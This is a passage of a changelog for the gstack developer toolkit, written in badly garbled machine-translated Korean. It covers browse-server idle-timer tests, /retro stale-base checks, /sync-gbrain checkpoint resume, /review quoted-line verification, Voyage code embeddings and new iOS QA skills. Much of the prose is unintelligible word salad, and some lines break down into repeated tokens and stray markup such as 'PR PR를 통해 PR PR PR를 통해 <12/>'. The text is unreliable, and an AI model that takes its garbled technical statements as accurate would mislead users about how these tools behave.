- **`__testInternals__` 수출**: `browse/src/server.ts` exposing `idleCheckTick`, `setTunnelActive`, `setLastActivity` 및 `resetShutdownState`에 있는 새로운 시험 전용 표면. 시험은 시험 사이 `Date.now`를 전 세계적으로 자전 없이 이중 조밀도 행동 deterministically 운동을 시도합니다 (누출한 단위 수준 setInterval와 상호 작용할 것입니다) 또는 누출 `isShuttingDown` 국가.

#### 추가

- **`browse/test/server-factory.test.ts`**: 새로운 `idle timer + onDisconnect dual-instance fix`는 5개의 행동 시험을 가진 구획을 묘사합니다. 기존 `makeMinimalConfig()` + `__resetRegistry()` 본을 공장 계약 시험에서 재사용하십시오; 새로운 `makeMockBrowserManager()` 돕는 사람. T1 (REGRESSION — headed embedder는 자동 하수구가 아닙니다), T2 (쌍으로 한 방어적인 - headless는 아직도 아래로 폐쇄합니다), T3 (chain semantics - 콜러 세트 onDisconnect는 `.rejects.toThrow`를 통해 + async, T4 (tunnelActive 차단 차단), T5 (정전 감시 - 정확하게 3cycleion 위치에 있는 3 주기 사용)를 통해 저장합니다.

#### 변경

- **`browse/test/sidebar-ux.test.ts`**: 1596년 선에 오래된 `idle check skips in headed mode` 끈 윤활 시험을 삭제했습니다 - `=== 'headed'` + `return`를 위해 grepped 하고 이중 조밀도 버그 현재도 통과했습니다. Behavioral 적용은 `server-factory.test.ts`에 Codex를 찾아서 (파일 회전의 맞은편에 부분 시험 도움자 개조; 공장 시험 파일이 이미 최소 CFg + 레지스트리 재 설치) 해결했습니다.

#### 기여자

- **Cross-model 리뷰 참고**: eng 검토의 정적 배치 통행은 건축술, 코드 질 및 성과에 있는 "0개의 문제점" 말했다. Codex의 계획 검토는 그 때 실제적인 코드에 있는 6개의 문제점을 지상에 놓았습니다: Bun는 동적 수입을 기념합니다 (그래서 `await import('../src/server')`는 테스트 당 신선한 단위 국가를 제공하지 않습니다), `initRegistry`는 테스트 사이 토큰 재사용에 던지고, `shutdown()`는 async (sync `.toThrow()`는 거절을 붙잡지 않을 수 없습니다), `cfg.browserManager.onDisconnect`는 콜러가 놓을 수 있는 public 분야, 원래 계획은 SIGTERM 선 1186에 놓은, 그리고 시험은 `server-factory.test.ts`에 속하지 않았습니다. 모든 코드는 실제 6/>에 대하여 확인되지 않았습니다. 정적 인 eng 검토의 블라인드 스폿은 여기서 runtime/module-cache semantics; 수업은 정적 패스에서 "0 문제"가 2 모델 합의보다 약한 신호입니다.

## [1.43.2.0] - 2026-05-21

## **3개의 주력 워크플로는 사용자들에게 의존하지 않습니다: /retro는 narrative를 날조하기 전에 stale base를 검출합니다. /sync-gbrain는 gbrain의 체크포인트에서 35분의 수입 루프를 재시작하고 /review는 각 찾은 코드를 동기 부여하는 코드 라인에 인용합니다.** ## **15 커뮤니티 PRs plus 침묵의 트리오 토지 한 번에: 26 비스듬한은 모든 수정을 핀으로 회귀 테스트와 함께 커밋.**

포스트 데구 파. v1.42.0.0 닫은 23 사용자 파일 버그 2 일 전; 이 파는 닫습니다 18 더 (15 커뮤니티 PR + 3 자체 파일 침묵 문제) 같은 하나-PR 패턴. 헤드 라인 변경은 무슨 일이 일어나는지: `/retro` no 더 긴 날짜 창이 잘못될 때 confidently-wrong 복고풍을 렌더링합니다, `/sync-gbrain --full` no 긴 SIGTERMs는 no 큰 두뇌에 경로를 다시 시작, 그리고 `/review` no 더 긴 선박은 절반 품목이 틀린 FPs를 발견하는 명부를 찾아내는 목록은 검사관을 결코 grep'd를 확인하기 위하여 결코 흠뻑 취하지 않습니다.

### 중요 한 숫자

출처: `git log v1.42.2.0..HEAD --oneline` (26개의 커밋) 플러스 테스트 스윕을 모든 파 터치 파일에서.

| Surface | 의 전 | 후지후 |
|---|---|---|
| `/retro`는 `origin/<default>`가 실제 먼 뒤에 일인 지휘자 worktree에, 세션 콘텍스트 drift "today" 앵커와 OR | 0 또는 가까운 zero 커밋에서 깨끗 한 보기 복을 생산합니다. - 정확히 작업의 마지막 5 일을 놓습니다. 다음 PR (#1624)에 대한 버전 범퍼가 있을 때 사용자 만 통지 | 단계 0.5 전조 감시는 4개의 주문한 체크를 실행합니다: no-remote 건너뛰기, detached-HEAD 건너뛰기, fetch-fail warn (offline), stale-base BLOCK 최신 조율의 명시적인 인용을 가진. 경로를 건너십시오 retro narrative (" offline 달리는, 창은 아무 일이 일어났지 않는 신선도에 의하여 증명되지 않습니다. |
| `/sync-gbrain --full` 2000 파일 뇌에 | 하드 코딩 35 분 (exit 143)에 SIGTERMs. gbrain 잎 `~/.gbrain/import-checkpoint.json` 노후화 디르에 지적, 그러나 메모리 - 가장 어린은 SIGTERM에 dir를 청소. 찰상과 SIGTERMs에서 모든 재활 휴게 (#1611) | Bounds-checked env vars: `GSTACK_SYNC_MEMORY_TIMEOUT_MS` and `GSTACK_SYNC_CODE_TIMEOUT_MS` (60_000–86_400_000ms range; bad values warn + default). SIGTERM preserves the staging dir when gbrain has checkpointed it. Next run reads gbrain's own checkpoint and resumes from processedIndex+1. If the staging dir is gone (disk pressure cleanup, OS reboot, user manual cleanup), warn one line and restage from scratch. Reuses gbrain's checkpoint as source of truth — no double-store. |
| `/review` 장고 + DRF repo | 4 of 8 finds FP — "field는 모델에 존재하지 않습니다", "dict.get()는 None", "save() 필드를 잃을 수 있습니다", "update_fields는 X를 놓을 수 있습니다." 실제 모델 코드를 읽으려면 각 resolvable, 그러나 검토자는하지 않았다 (#1539) | 사전등록 게이트: 모든 발견은 파일이 필요합니다:라인 + 동사각 텍스트의 라인의 그것을 동기 부여. 4-5을 신뢰하는 무인화 된 발견, 기존 "<7 → 억제" 규칙 자동 불. 그들은 모두 실제로 존재하지 않는 코드 인용을 필요로하기 때문에 4 이름 FP 클래스 붕괴. Framework-meta nudge는 Django Meta / Rails 협회 / SQLAlchemy relationships / TypeORM decorators / Sequelize init / Prisma 생성 클라이언트를 인용하는 작성자를 안내합니다. Deeper ORM-aware 검증은 미래 파로 흩어지게합니다 (`~/.gstack-dev/plans/1539-framework-aware-review.md`). |
| `/sync-gbrain --full` 에 신선한 등록 코드 소스 (0 페이지) | 기존 페이지만 재 조립된 `gbrain reindex-code`를 호출하면, No 코드 페이지가 다시 인덱스로 표시됩니다. ~1s의 마감은, OK를 보고하면서 코드 인덱스를 영구적으로 빈 상태로 나타날 수 있습니다. | `gbrain sync --strategy code` 첫번째 (페이지 조정 도보)를 달아, 그 후에 `reindex-code`. 신선한과 대중적인 근원 둘 다를 위한 문서화된 “full walk + reindex” 계약을 명예를 붙입니다. PR #1584를 통해 @jetsetterfl에 의해 공헌하십시오. |
| `gbrain doctor` 내부 repo `.env` | Bun는 프로젝트 `.env`를 자동 로드합니다; gbrain는 잘못된 DB에 연결합니다; 분류기 보고 `broken-db`는 그렇지 않으면 건강 뇌에; 60s를 위해, 어디에서든지에서 모든 probe를 독해했습니다 | `buildGbrainEnv`를 통해 프로브 경로는, 동일한 도움자 동기화 관현관 용도를 사용합니다. `DATABASE_URL`는 `~/.gbrain/config.json`에서 종결됩니다. 결과는 cwd-independent입니다 - 60s 캐시는 no 더 긴 소문을 깨끗한 감독에게 전파합니다. PR #1583를 통해 @jetsetterfl에 의해 공헌하십시오. |
| `/sync-gbrain` Supabase PgBouncer 트랜잭션 모드 풀러에 대한 | Sync는 준비된 상태 오류 중류로 실패합니다. PgBouncer 거래 모드는 세션 레벨 준비된 진술을 지원하지 않습니다. | 트랜잭션 모드 풀러를 감지하고 `GBRAIN_PREPARE=true`를 설정하므로 gbrain은 호환되는 문 처리로 돌아갑니다. #1435를 닫습니다. PR #1591를 통해 @mikeangstadt에 의해 기여했습니다. |
| Supabase 프로젝트 DATABASE_URL `supabase projects api` | 트랜잭션 모드 풀러 URL (포트 6543)를 반환합니다. gbrain sync는 "prepared 문이 존재하지 않는"로 실패합니다. | 세션 모드 풀러 URL (포트 5432)로 새로운 프로젝트의 경우를 다시 작성합니다. #1301를 닫습니다. PR #1582를 통해 @0xDevNinja에 의해 기여했습니다. |
| `bun run benchmark prompt.txt --models claude` | argv 파서는 `claude`를 기치값으로, `prompt.txt`를, 침묵으로 실행합니다 잘못된 모형에 벤치 마크를 취급합니다 | 플래그 값과 위치 프롬프트는 올바른 순서로 파쇄됩니다. #1603를 닫습니다. PR #1604를 통해 @jbetala7에 의해 기여했습니다. |
| `gstack-config get explain_level` | 빈 반환 — 키는 기본 테이블에 없었다, 그래서 모든 preamble는 쓰기 스타일로 떨어졌다 default branch 심지어 사용자가 terse를 설정했을 때 | `default`, `gstack-config list`와 `gstack-config defaults`에서 보여줍니다. #1607를 닫습니다. PR #1608를 통해 @jbetala7에 의해 공헌하는. |
| 프로젝트 내부의 `gstack-learnings-search --cross-project` | 크로스 프로젝트 검색 숨겨진 현재 프로젝트 학습 - 발견 필터 제외 `*/$SLUG/*` 그리고 bash branch 절대 복원되지 | 현재 프로젝트 항목 명시적으로 태그 `current\t<line>` 을 곱하기 전에 크로스 프로젝트 항목 태그 `cross\t<line>` 으로 합병. 닫기 #1618. 에 의해 기여 @jbetala7 를 통해 PR #1619. |
| `gh pr merge` `/land-and-deploy`에서 비제로 출구 | 기술 정지, 배포 결코 실행되지 — 하지만 PR 이미 될 수 있습니다 MERGED 서버 측 (현재 merge, 또는 로컬 정리 단계 실패 후 merge 성공) | 새로운 §4a-postfail 체크 쿼리 `gh pr view --json state,mergeCommit` 어떤 비 소토 출구 후. MERGED → 기록 merge SHA, uncommitted-work 감시를 가진 비 파괴적인 worktree 정리를 제안하고, 계속 §4a CI 시계. OPEN → probe `autoMergeRequest`. CLOSED → STOP. 단단한 규칙: `gh pr merge`를 통해 PR PR를 통해 PR PR PR를 통해 <12/>를 통해 재해하지 마십시오. |
| `gstack-config` Claude Code의 슬래시 명령 | `/gstack`는 루트 SKILL.md가 `name: gstack` 하지만 no 슬래시 별명 등록을 했기 때문에 "알 수없는 명령"을 반환했습니다. | 설정은 `_gstack-command` Claude 래퍼가 루트 SKILL.md에서 포인팅을 함으로써 발견을 위해 `name: gstack`를 보존합니다. `gstack-relink` `skill_prefix` 플립 후 #1543를 지칭합니다. PR #1577를 통해 @jbetala7에 의해 기여합니다. |
| `bun run scan-secrets` Windows | `command -v gitleaks` `cmd.exe` PATH - probe는 설치될 때도 누락된 gitleaks를 취급합니다 | `command -v` 대신 `execFileSync('gitleaks', ['--version'])`를 통해 프로브. #1545를 닫습니다. PR #1546를 통해 @jbetala7에 의해 공헌하는. |
| `gstack-artifacts-url` `github.com` 또는 `garrytan`를 저장소로 받아 들일 수 있습니다. | Validator는 호스트 전용 또는 소유자 전용 입력을 repos로 전달; downstream 코드는 깨진 URL을 방출 | 경로 구성 요소가 `<owner>/<repo>`일 때 명확한 오류로 거부합니다. #1597를 닫습니다. PR #1598를 통해 @jbetala7에 의해 기여합니다. |
| `/qa` on Ubuntu with AppArmor blocking unprivileged Chromium sandboxing | `/qa` 실행에 걸린다. - 커널은 정상적인 사용자를 위해도 비공개 사용자 네임스페이스 Chromium의 필요성을 부인한다. | `GSTACK_CHROMIUM_NO_SANDBOX=1` 옵트인 env override는 다른 모든 사람들을 위해 default를 변경하지 않고 모래 상자를 덮습니다. v1.42.2.0에서 Headed-launch sandbox-on-Linux-dev 행동은 보존했습니다. PR #1562를 통해 @techcenter68에 `shouldEnableChromiumSandbox()` 의 도움으로, v1.42.2.0에 착륙했습니다. |
| `gstack browse` 서버 내부 Claude Code의 per-command Bash sandbox, 지휘자, 또는 CI 단계 주자 | `Bun.spawn().unref()`는 Bun의 이벤트 루프에서 아이를 제거하지만 `setsid()`를 호출하지 않습니다. 세션 리더의 종료 SIGHUPs 세션에서 PID - 검색 서버 (그리고 Chromium grandchildren)는 다음 명령이 실행되기 전에 죽는다 | macOS/Linux Node의 `child_process.spawn`를 통해 산란 경로는 `detached:true`로, `setsid()`로 호출됩니다. 서버는 자체 세션 리더 (PPID=1)로 되며, 산란 포탄의 출구를 생존합니다. Windows 경로가 변경되지 않습니다 ( Node-via-Bun launcher를 통해 이미 수정되었습니다). PR를 통해 @bharat2913에 의해 기여했습니다. |
| `GSTACK_CHROMIUM_PATH` 사용자 정의 Chromium 빌드, headless 출시 | 커넥티드 경로는 headless `launch()`, headed `launchPersistentContext()`에 적용되지 않았습니다. Headless 콜러는 번들 Chromium로 돌아갔습니다 | `isCustomChromium()` 가시광을 headless 발사 경로로 덮었습니다. Chromium 가시성을 다룬다. PR #1614를 통해 @shohu에 의해 공헌했습니다. |
| `$D design generate` 느리게 OpenAI 응답 | Default 60s 타임아웃 시간 더 큰 세대를 완료하기 전에 | 240s에 흠뻑 취하고 `gpt-image-2` (이 같은 품질에 대해 `gpt-image-1`보다 빠르게 표시되어 있음). #1519를 닫습니다. PR #1586를 통해 @matteo-hertel에 의해 기여했습니다. |
| `bin/gstack-gbrain-lib.sh` `_gstack_gbrain_validate_varname` macOS 포탄에 | Default locale (en_US.UTF-8)는 `case [A-Z를 만듭니다_]` glob brackets match lowercase letters too — `lower_case` passes validation, then trips `printf -v "$varname"" 의 " valid 식별자가 아닌" 의 호출기는 다른 실패와 구별할 수 없습니다 | `local LC_ALL=C` 핀은 ASCII- macOS와 리눅스에서만 부류 semantics를 줍니다. 게다가 `local`는 이렇게 핀이 mutate 콜러의 Locale를 넓히지 않습니다. PR #1606를 통해 @andrey-esipov에 의해 공헌했습니다. |

### 적용

침묵하는 충격 trio를 위한 3개의 새로운 회귀 시험 파일, 및 그들의 자신의 적용 없이 지역 사회 PRs를 위한 3개의 적용 시험, 플러스 1개의 운동 회귀 갱신 및 1개의 황금 기초 새로 고침:

- `test/regression-1624-retro-stale-base.test.ts` - 13개의 정적 invariants는 4개의 사전 검사 branch + 주문 + 공시에 꼿습니다
- `test/regression-1611-gbrain-sync-resume.test.ts` - 19의 시험: `resolveStageTimeoutMs` (바운드, 비핵, 범위), `decideResume` (no 체크포인트, 손상 JSON, staging present/missing, dir-less checkpoint), SIGTERM 보전 순서에 3개의 정체되는 invariants
- `test/regression-1539-review-self-verify.test.ts` — 12의 시험: 해결사 텍스트 + 모든 4개의 이름 FP 클래스 + 프레임 워크 메타 판 + deferred-design-doc 참조 + propagation to all four downstream SKILL.md 소비자 + 기존의 신뢰 규칙 unchanged
- `test/gbrain-lib-validate-varname.test.ts` — 8개의 시험: uppercase/digit/underscore는, 더 낮은 케이스 거부했습니다 (OS-locale FP), 혼합 케이스 거부, LC_ALL=C 로컬를 scoping
- `browse/test/cli-setsid-daemonize.test.ts` — 4개의 정체되는 invariants: nodeSpawn는, 비 Windows를 사용하여 detached:true + unf, 코멘트 문서 setid/SIGHUP, no Bun.spawn를 macOS/Linux로 사용합니다.
- `test/land-and-deploy-postfail.test.ts` — 12의 시험: §4a-postfail 선물, §4a의 gh 상류벌레 refs의 3개의 국가 branch, 합병SHA 붙잡음, 비파괴적인 worktree 정리, 단단한 “never retry” 규칙, 원자 팽창식
- `test/gstack-gbrain-detect-mcp-mode.test.ts` — PR #1591의 새로운 `gbrain_pooler_mode` 열쇠를 위해 새롭게 하는 스키마 회귀
- `test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md` — 수정자 파이프라인을 통해 ship/SKILL.md로 구워진 검증문 텍스트와 일치하도록 재 생성
- `test/learnings-injection.test.ts` - PR #1619의 태그라인 모양 (SLUG env var no 더 긴 bun 구획 안쪽에 필요로 하는)

각 파터치 테스트 파일이 고립에 전달됩니다. `bun test`의 크로스 파일 오염은 사전 노출을 유지하고 문서화됩니다 (v1.42.0.0 CHANGELOG).

### 이 빌더를 위한 뜻

`/retro`를 지휘자 branch에서 실행하면 몇 일 동안 진행되고 있는 기술 no는 stale 창에 대하여 더 긴 자신감이 있는 복고풍을 더 직물합니다 — 그것은 당신이 창이 stale이고 오늘 날짜 또는 재 그림에 확인하는 것을 요구합니다. 당신이 큰 뇌를 동기화하는 경우에 (~2000+ 파일), 중단한은 `processedIndex+1`에서 다음 `/sync-gbrain`에서 매번 찰상에서 재기합니다. If you use `/review` on a Django/Rails/SQLAlchemy/TypeORM/Sequelize/Prisma repo, framework-shape false positives drop because the reviewer is forced to quote the line that motivates each finding before it lands in the report. If you're on Ubuntu/AppArmor, `GSTACK_CHROMIUM_NO_SANDBOX=1` unblocks `/qa`. If you run gstack inside Claude Code's per-command sandbox or Conductor's worktree harnesses, the browse server survives the spawning shell's exit via setsid. Pull and run `/gstack-upgrade`; no migration needed.

### 항목화 된 변경

#### 추가

- `scripts/resolvers/confidence.ts` (확장) - 검토, cso, 계획 - eng - 검토에 의해 소모된 전 에미트 검증 문, 및 선체 파이프라인을 통해 배. 새로운 기계장치를 발명하는 대신 기존의 `confidence < 7 → suppress` 규칙을 재사용하십시오.
- `bin/gstack-gbrain-sync.ts` (새로운 수출: `resolveStageTimeoutMs`, `readGbrainCheckpoint`, `decideResume`) - 경계 (60_000-86_400_000ms); gbrain의 자신의 `~/.gbrain/import-checkpoint.json`를 진실의 근원으로 재사용하는 재발동 탐지.
- `bin/gstack-memory-ingest.ts` (새로운 개인: `stagingDirIsCheckpointed`) — SIGTERM 핸들러는 gbrain가 체크 포인트 포인트를 기록했을 때 staging dir를 보존합니다. Honors `GSTACK_INGEST_RESUME_DIR`는 이렇게 관현관이 아이들에게 기존의 staging dir을 수 있게 합니다.
- `retro/SKILL.md.tmpl` (새로운 단계 0.5) - stale-base + 나쁜 일상 - 불빛 감시. 4 주문 사전 체크 지점.
- `land-and-deploy/SKILL.md.tmpl` (새로운 §4a-postfail) — 포스트 실패 PR-state check; 비 제로 출구 후에 `gh pr merge`를 결코 retries하지 마십시오.
- `browse/src/browser-manager.ts` (`shouldEnableChromiumSandbox` 제외) - `GSTACK_CHROMIUM_NO_SANDBOX=1` 옵트인 오버라이드.
- 6개의 새로운 회귀 시험 파일 플러스 3개의 적용 시험 (위의 적용을 보십시오).

#### 변경

- `bin/gstack-gbrain-sync.ts:runCodeImport` — `--full`는 `reindex-code` (페이지 조정 도보)의 앞에 `--full`를 실행합니다. 신선한과 대중화한 근원을 위한 "전방 + 재구성" 계약을 명예를 붙입니다. PR #1584를 통해 @jetsetterfl에 의해 공헌하는.
- `lib/gbrain-local-status.ts:freshClassify` - probe env routes through `buildGbrainEnv` so `DATABASE_URL`는 `~/.gbrain/config.json`에서 종결되고 결과는 cwd-independent 입니다. PR #1583를 통해 @jetsetterfl에 의해 공헌하십시오.
- `bin/gstack-gbrain-detect`, `lib/gbrain-exec.ts`, `sync-gbrain/SKILL.md.tmpl` — PgBouncer 거래 형태 풀러 탐지 세트 `GBRAIN_PREPARE=true`. PR #1591를 통해 @mikeangstadt에 의해 공헌하는.
- `bin/gstack-gbrain-supabase-provision` - 트랜잭션 모드 풀러 URL (port 6543)를 세션 모드로 바꿔 놓습니다 (포트 5432) 새로 제작된 Supabase 프로젝트. PR #1582를 통해 @0xDevNinja에 의해 기여했습니다.
- `bin/gstack-config` - `explain_level` 기본 테이블과 활성 값 목록에 노출. PR #1608를 통해 @jbetala7에 의해 기여.
- `bin/gstack-model-benchmark` — argv 파싱 경로 플래그 값과 위치 프롬프트가 올바르게 전달됩니다. PR #1604를 통해 @jbetala7에 의해 기여했습니다.
- `bin/gstack-artifacts-url` - 호스트 전용 또는 소유자 전용 리모트를 거부합니다. PR #1598를 통해 @jbetala7에 의해 기여했습니다.
- `bin/gstack-learnings-search` — 크로스 프로젝트 검색 태그 행 인라인 (`current\t<line>` vs `cross\t<line>`) 그래서 현재 프로젝트 항목은 결코 숨겨지지 않습니다. PR #1619를 통해 @jbetala7에 의해 기여.
- `setup`, `bin/gstack-relink` — `gstack` 슬래시 명령 별명으로 `_gstack-command` 래퍼를 통해 등록했습니다. PR #1577를 통해 @jbetala7에 의해 공헌하십시오.
- `lib/gstack-memory-helpers.ts` — `command -v` 대신 `execFileSync('gitleaks', ['--version'])`를 통해 gitleaks probe. Windows `cmd.exe`에 작동. PR #1546를 통해 @jbetala7에 의해 공헌.
- `bin/gstack-gbrain-lib.sh:_gstack_gbrain_validate_varname` — `local LC_ALL=C` 핀은 ASCII- macOS 포탄에 단지 부류 semantics를 줍니다. PR #1606를 통해 @andrey-esipov에 의해 공헌하는.
- `browse/src/cli.ts` — macOS/Linux `detached:true` (`setsid()`라고 함)을 통해 경로에 대한 디몬화. PR #1612를 통해 @bharat2913에 의해 기여.
- `browse/src/browser-manager.ts` - `isCustomChromium()` 가시광을 headless 발사로 덮습니다. PR #1614를 통해 @shohu에 의해 공헌하는.
- `design/src/{evolve,generate,iterate,variants}.ts` - 240s에 범람된 이미지 gen 타임아웃; 핀으로 꼿는 `gpt-image-2`. PR #1586를 통해 @matteo-hertel에 의해 공헌하는.

#### 고정

- `/retro` 침묵하는 confidently-wrong 산출 `today` 닻 편류 또는 `origin/<default>`는 stale (#1624)입니다. 단계 0.5 전 flight 감시에 의해 닫히는.
- `/sync-gbrain --full` SIGTERM는 35min, no gbrain's checkpoint (#1611)에서 재개합니다. env 몬 timeouts에 의해 닫히는 + 체크포인트 재사용 + SIGTERM 시효.
- `/review` 50% FP Django/Rails/SQLAlchemy에 비율은 FP 종류가 “field/method 모형에 존재하지 않는 경우에, (#1539) repo장합니다. motivating 선을 인용하기 위하여 각 찾는 것을 위한 사전 이동 검증 문에 의해 닫히십시오.

#### 기여자

- Defer-doc artifact `~/.gstack-dev/plans/1539-framework-aware-review.md` describes the multi-week framework-aware ORM verification extension (Django/Rails/SQLAlchemy detection, model-introspection helpers, migration-history-aware checks) intentionally deferred from this wave. Promote to active plan when v1.43.0.0 ships and a second high-volume FP report lands on a different framework, or a follow-up retro shows the lighter quoted-line gate doesn't deliver measurable FP reduction.
- 대구 패턴 보존 된 파형 : ONE 묶음 PR 비스듬한 커밋으로 `.tmpl` 편집 + `gen:skill-docs` 재생 쌍, 중간 검증 체크포인트, commit 저자 + 발러에서 획득 한 원본 기여자. 에이전트 메모리에서 `[[feedback_one_pr_fix_waves]]`를 참조하십시오.


## [1.43.1.0] - 2026-05-21

## **Local gbrain PGLite는 이제 `VOYAGE_API_KEY`가 설정될 때 Voyage의 코드 전문 embedding 모델에 기본적으로 기본값입니다.** ## **Symbol search는 실제 코드 쿼리에 대한 테스트 위의 구현 파일 순위를 매깁니다.**

gstack-driven PGLite는 이제 `voyage:voyage-code-3` (1024-dim)을 default embedding model when `VOYAGE_API_KEY` 가 env. 폭포 뒤로 gbrain의 자동 선택된 공급자 사슬 (OpenAI `text-embedding-3-large` 1536-dim when `OPENAI_API_KEY` set, etc.) 때 항해 열쇠가 absent. 스위치는 `/setup-gbrain`에 있는 3개의 PGLite init 위치, 끊긴 코드 3개의 PGLite를, 직접적인 포스트를 삽입합니다. 두 가지 새로운 테스트 파일 핀 계약 : 가짜 gbrain에 대한 템플릿의 항해 게이트 쉘을 실행하는 무료 세분화 테스트는 `VOYAGE_API_KEY` set/unset/empty, 및 실제 항해 통합 테스트 (API 키없이 스키)를 통해 argv를 확인하기 위해 `gbrain init` + `sync --strategy code`를 실행하고 치수의 mismatches, 침묵 임베딩 실패 및 공급자 어댑터 회귀를 잡기 위해.

### 중요 한 숫자

출처: `gbrain query --no-expand` (펄스 리 트리발, no LLM 확장)을 사용하여 이 코코더에 `voyage-4-large`에 대한 머리에 머리에 머리 A/B. 10 현실적인 코드 쿼리, 상징 구경의 혼합, semantic intent, 및 디자인 질문.

| Surface | voyage-4-대 | 구시 코드-3 | Δ |
|---|---|---|---|
| Strict wins (오른쪽 간단한 파일이 테스트 파일을 이길) | — | 4 | +4 |
| Ties (소위 히트) | 5 | 5 | 0 |
| Losses | 0 | 0 | 0 |
| TOP-1 신뢰 (avg) | 0.84 | 0.90 | +0.06 |
| 1M 토큰 당 비용 | $0.18 | $0.18 | 0 |

| Query를 | voyage-4-큰 탑 히트 | voyage-code-3 탑 히트 |
|---|---|---|
| `ownsTerminalAgent` | `terminal-agent-integration.test.ts` (테스트) | `terminal-agent.ts` (단추) |
| `ServerConfig terminal-agent teardown ownership` | `pair-agent-e2e.test.ts killDaemon` (로즈 매치) | `terminal-agent.ts disposeSession` |
| `unicode sanitization at server egress` | `sanitize.test.ts` | `server-node.mjs sanitizeReplacer` |
| `how does websocket auth use Sec-WebSocket-Protocol` | no 결과 | `terminal-agent.ts buildServer` |

이 승리 패턴은 정확히 무엇 voyage-code-3 광고 : 쿼리가 코드 개념 인 경우 테스트에 대한 서핑 구현 소스. 비용은 1M 토큰 당 $ 0.99에서 구시지-4-large에서 변경되지 않습니다. 100K-LOC repo의 전체 재구성은 약 $0.20에 달합니다.

### 이 빌더를 위한 뜻

`VOYAGE_API_KEY` 설정 및 실행 `/setup-gbrain` 신선한 기계, `gbrain code-def`, `code-refs`, 그리고 당신의 worktree에 대하여 semantic 쿼리는 지금 지속적으로 높은 신뢰도 시험 정착물의 위 실제적인 실시 파일을 평가합니다. No 깃발은, no 편집하기 위하여 윤곽을 전달합니다. 기존하는 뇌는 어떤 embedding 모형든지에 건축되었습니다. 새로운 default는 단지 신선하게 적용합니다. If you re-run `/setup-gbrain` on a machine that already has an OpenAI 1536-dim brain at `~/.gbrain/brain.pglite/`, the config rewrite triggers a column-dim mismatch that `gbrain doctor` will flag clearly. Recovery is `mv ~/.gbrain/brain.pglite ~/.gbrain/brain.pglite.bak && gbrain init --pglite --embedding-model voyage:voyage-code-3 --embedding-dimensions 1024` followed by a fresh `/sync-gbrain`.

### 항목화 된 변경

**Added**
- `test/gbrain-init-voyage-code-3.test.ts` — 5개의 세례적인 테스트는 voyage 문 포탄 semantics + 문이 정확하게 3개의 PGLite init 위치에 나타나는 것을 증명하는 템플 모양 invariant를 덮습니다
- `test/gbrain-sync-voyage-code-3-integration.test.ts` — 4개의 시험 (1개의 항상 감시, 3개의 voyage gated)는 모래 상자 PGLite에 대하여 진짜 `gbrain init --pglite --embedding-model voyage:voyage-code-3` + `sync --strategy code`를 실행하는, 모래판 PGLite에 대하여, 둥근 지구, 의사 보고 no 차원 mismatch, 그리고 `code-def` 발견한 상징을 삽입합니다. `VOYAGE_API_KEY` 또는 `gbrain` CLI가 absent 때 갑니다

**의 확장**
- `setup-gbrain/SKILL.md.tmpl` — 3개의 PGLite init 위치 (Step 1.5 끊긴 db rollback, 경로 3는, 단계 4.5 쪼개지는 엔진을 지시합니다) 지금 문 `--embedding-model voyage:voyage-code-3 --embedding-dimensions 1024`에 `VOYAGE_API_KEY`. gbrain의 자동 선정한 공급자 사슬에 뒤를 뒤로 뿌립니다
- `sync-gbrain/SKILL.md.tmpl` - 2 수동 수리 힌트 (D12 누락 엔진, D4 부수정 구성)는 같은 미들백 패턴과 같은 항해 플래그를 제안합니다
- `bin/gstack-gbrain-install` - post-install "Next:" 힌트는 키가 설정될 때, 키 설정에 대한 팁을 인쇄합니다.
- `USING_GBRAIN_WITH_GSTACK.md` - Path 3 docs는 embedding 모델 선택과 A/B 합리적 설명
- `CLAUDE.md` - API 키에 대한 구식 `~/.zshrc grep+eval` 조리법을 삭제합니다. `GSTACK_*` env-shim (`lib/conductor-env-shim.ts`)의 점은 대문 응답으로. 시험에 대한 에이전트 SDK `env: {...}` gotcha를 지키십시오.

**연구분야**
- `setup-gbrain/SKILL.md`, `sync-gbrain/SKILL.md` - 템플릿 편집 후 `bun run gen:skill-docs --host all`를 통해 새로 고침


## [1.43.0.0] - 2026-05-20

## **실제 아이폰에 iOS QA - no XCTest, no WebDriverAgent, no 시뮬레이터.** ## **실제 아이폰 17 프로 맥스 실행 iOS 26.5에 종료; HTTP를 말하는 어떤 에이전트는 실제 아이폰 앱에 대한 전체 QA를 실행할 수 있습니다, 로컬에서 USB 또는 스태크에 원격으로.**

5개의 새로운 기술 (`/ios-qa`, `/ios-fix`, `/ios-design-review`, `/ios-clean`, `/ios-sync`)는 `time-attack/gstack`에서 실제로 배에 필요한 경화를 가진 상류를 가져옵니다. 건축의 짐 방위 통찰력: 하락 XCTest, 하락 시뮬레이터, 하락 WebDriverAgent. 시험의 밑에 iOS 앱에 있는 HTTP 서버, 드라이브에 그것을 모십시오 daemon를 통해 daemon를 발사하십시오. 이 에이전트는 SwiftPM 신속한 접점 도구를 통해 스위프트 소스, 코겐 유형 `@Observable` accessors를 읽습니다 (TS 빠른 첫 번째 실행을위한 fallback), 디버그 다리를 배치하고 닫힌 find→fix→verify 루프를 실행합니다. 옵션 `--tailnet` 플래그와 함께 Mac daemon는 스태크를 바인딩하고 정통 원격 통화를 허용합니다. Mac plus iPhone을 이미 소유하고있는 iPhone은 iOS QA에 대한 꼬리 에이전트가됩니다.

두 개의 Mac 측 CLIs 배는 기술을 따라: `gstack-ios-qa-daemon` 중개인은 에이전트와 연결 된 iPhone 사이 트래픽, 그리고 `gstack-ios-qa-mint`는 tailnet allowlist (grant/Reoke/list)를 위한 소유자 과립 도구입니다. [docs/howto-ios-testing-with-gstack.md](docs/howto-ios-testing-with-gstack.md)에서 전체 end-to-end walkthrough 생활.

SwiftUI Buttons synthesized-tap support: on iOS 18+ the hit-test resolves through `_UIHitTestContext` and walks up to `SwiftUI.UIKitGestureContainer` (a UIResponder that isn't a UIView). The KIF-derived `DebugBridgeTouch` Objective-C target passes that responder through to `UITouch.setView:` directly, mirroring KIF PR #1323. Verified live: counter went 0 → 4 across four `POST /tap` requests on a real iPhone 17 Pro Max running iOS 26.5.

### 중요 한 숫자

출처: 81 daemon 단위/integration 테스트 + 20 코겐 테스트 + 8 높은 수준 E2E 테스트 + 실제 iPhone 연기 실행 (commit `cf65bb05`), 모든 `test/fixtures/ios-qa/FixtureApp/`에서 정착물에서 재현 가능.

| Surface | 포크 as-is | 배틀그라운드 |
|---|---|---|
